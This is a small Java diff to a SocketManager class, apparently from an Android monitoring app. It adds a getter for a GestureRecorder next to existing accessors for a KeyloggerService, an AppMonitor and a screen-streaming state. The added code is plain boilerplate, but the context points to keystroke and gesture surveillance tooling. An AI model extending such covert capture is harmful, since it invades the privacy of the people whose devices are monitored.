@@ -138,6 +138,7 @@ public class SocketManager {
     /** Expose appMonitor so UnifiedAccessibilityService can call it. */
     public AppMonitor getAppMonitor()       { return appMonitor; }
     public KeyloggerService getKeylogger()  { return keyloggerService; }
+    public GestureRecorder getGestureRecorder() { return gestureRecorder; }
 
     /** Whether streaming is currently active (idle-frame mode on). */
     public boolean isStreamingActive() { return idleFrameMode && connected; }
